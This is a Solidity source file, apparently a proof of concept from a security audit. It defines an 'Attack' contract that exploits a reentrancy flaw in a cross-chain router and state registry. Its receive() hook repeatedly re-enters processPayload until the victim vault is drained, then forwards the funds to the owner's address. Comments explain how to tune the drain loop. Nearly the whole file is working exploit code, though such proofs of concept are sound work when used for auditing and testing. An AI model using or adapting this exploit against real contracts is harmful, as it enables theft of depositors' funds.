/**
 * SPDX-License-Identifier: Apache-2.0
 */
pragma solidity ^0.8.14;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1155Holder} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import {ERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
import {IERC165} from "@openzeppelin/contracts/interfaces/IERC165.sol";
import {StateReq} from "../types/DataTypes.sol";
import {LiqRequest} from "../types/LiquidityTypes.sol";
import {StateRegistry} from "../crosschain-data/StateRegistry.sol";
import {SuperRouter} from "../SuperRouter.sol";
import {VaultMock} from "../mocks/VaultMock.sol";

// https://solidity-by-example.org/call/

/// @dev Attack contract must be able to hold the ERC1155 super positions
contract Attack is Ownable, ERC1155Holder {
    address payable immutable superRouterSource;
    address payable immutable stateRegistryDestination;
    address payable immutable superDestination;
    address immutable victimUnderlyingAsset;
    address immutable victimVault;

    constructor(
        address payable superRouterSource_,
        address payable stateRegistryDestination_,
        address payable superDestination_,
        address victimUnderlyingAsset_,
        address victimVault_
    ) {
        superRouterSource = superRouterSource_;

        stateRegistryDestination = stateRegistryDestination_;

        superDestination = superDestination_;

        victimUnderlyingAsset = victimUnderlyingAsset_;

        victimVault = victimVault_;

        /// @dev TODO - Verify where to do the approve

        IERC20(victimUnderlyingAsset).approve(
            superRouterSource,
            type(uint256).max
        );
    }

    receive() external payable {
        /// @dev the last payload id is obtained (during execution this will be the same)
        uint256 payloadId = StateRegistry(stateRegistryDestination)
            .payloadsCount();

        /// @dev the vault balance is obtained. This method of looping is rough but works
        /// @dev the best would be to set a variable with the number of loops needed to deplete the vault (calculate beforehand)
        /// @dev this check is important because if the transaction reverts in SuperDestination it enters the catch block
        /// @dev of the destination chain stateRegistry processPayload() function, which reverts
        uint256 vaultBalance = VaultMock(victimVault).balanceOf(
            superDestination
        );

        if (vaultBalance > 999) {
            // send enough eth as gas to keep the tx alive, 1 as example
            try
                StateRegistry(stateRegistryDestination).processPayload{
                    value: 1
                }(payloadId)
            {} catch {}
        }

        /// @dev transfer everything to owner EOA at the end
        (bool success, ) = payable(owner()).call{value: address(this).balance}(
            ""
        );
        require(success, "Withdrawal failed");
    }

    /// @dev to make the first deposit into the source chain
    function depositIntoRouter(
        LiqRequest[] calldata _liqData,
        StateReq[] calldata _stateData
    ) external payable onlyOwner {
        SuperRouter(superRouterSource).deposit{value: msg.value}(
            _liqData,
            _stateData
        );
    }

    /// @dev to make the first withdrawal from the source chain
    function withdrawFromRouter(
        LiqRequest[] calldata _liqData,
        StateReq[] calldata _stateData
    ) external payable onlyOwner {
        SuperRouter(superRouterSource).withdraw{value: msg.value}(
            _liqData,
            _stateData
        );
    }

    /// @dev could be removed since anyone can call processPayload
    function processPayload(uint256 payloadId) external payable {
        StateRegistry(stateRegistryDestination).processPayload{
            value: msg.value
        }(payloadId);
    }

    function supportsInterface(
        bytes4 interfaceId
    ) public view virtual override(ERC1155Receiver) returns (bool) {
        return super.supportsInterface(interfaceId);
    }
}
